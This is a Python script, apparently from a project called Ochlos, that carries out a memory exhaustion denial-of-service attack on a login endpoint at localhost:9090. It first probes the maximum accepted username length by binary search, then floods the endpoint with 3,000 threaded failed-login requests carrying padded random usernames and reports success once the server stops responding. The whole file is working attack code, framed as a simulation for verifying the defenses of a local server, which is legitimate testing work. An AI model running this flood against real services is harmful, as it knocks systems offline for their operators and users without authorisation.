# Ochlos/scripts/memory_exhaustion.py
# Perform memory exhaustion attack to localhost:9090

import requests
import threading
import urllib3
import requests
import uuid
import concurrent.futures


# Disable SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "https://localhost:9090/login"

# Binary search function to probe maximum username length
stop_event = threading.Event() # Stop exec flag
max_username_len = 32
def find_max_username_length():
    print("[+] Probing target server for maximum allowed username length...")
    low = 3
    high = 5000
    detected_max = 32 # Fallback default on failure
    while low <= high:
        mid = (low + high) // 2
        test_username = "A" * mid
        payload = {
            "username": test_username,
            "password": "wrong_password"
        }
        
        try:
            r = requests.post(TARGET_URL, data=payload, verify=False, timeout=2)
            # (Status codes 200, 401, 429 mean validation passed)
            if r.status_code in [200, 401, 429]:
                detected_max = mid
                low = mid + 1 # (Try larger lengths)
            else:
                high = mid - 1 # (Try smaller lengths)
        except Exception:
            high = mid - 1
            
    print(f"[+] Probing complete. Detected max username length: {detected_max} characters.")
    return detected_max

def send_failed_login(index):
    if stop_event.is_set():
        return

    suffix_len = min(8, max_username_len)
    random_suffix = uuid.uuid4().hex[:suffix_len]

    padding_len = max(0, max_username_len - suffix_len)
    random_username = "A" * padding_len + random_suffix

    payload = {
        "username": random_username,
        "password": "wrong_password"
    }

    if index % 100 == 0:
        print(f"[+] Sending request #{index}...")

    try:
        requests.post(TARGET_URL, data=payload, verify=False, timeout=1)
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
        if not stop_event.is_set():
            stop_event.set()
            print(f"\n[!] Attack Success! Server is down (DoS verified at request #{index}).")
            print("[+] Stopping attack program...")
    except Exception as e:
        pass


if __name__ == "__main__":
    max_username_len = find_max_username_length()

    print("[+] Starting Memory Exhaustion DoS Attack simulation...")

    # max_workers : thread
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(send_failed_login, range(3000))

    if not stop_event.is_set():
        print("\n[+] Verification: The server's available memory holds all 3,000 requests, or the GC is active.")
        print("[+] Defense Hardening Verified! Server remains healthy.")
    else:
        print("[+] Simulation complete")